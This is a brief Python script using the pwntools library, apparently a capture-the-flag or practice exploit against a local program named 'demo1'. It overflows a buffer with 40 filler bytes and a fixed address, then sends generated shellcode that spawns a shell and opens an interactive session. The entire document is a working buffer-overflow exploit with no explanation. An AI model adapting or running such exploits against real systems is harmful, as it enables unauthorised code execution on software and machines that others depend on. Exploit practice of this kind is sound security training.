from pwn import *
context.log_level = "debug"
context.arch = "amd64"
p = process("./demo1")
p.recvuntil("name: ")

#payload = "A"*40+p64(0x601080)
payload = flat(["A"*40,0x601080])
p.sendline(payload)
p.recvuntil("message: ")

p.send(asm(shellcraft.sh()))
p.interactive()

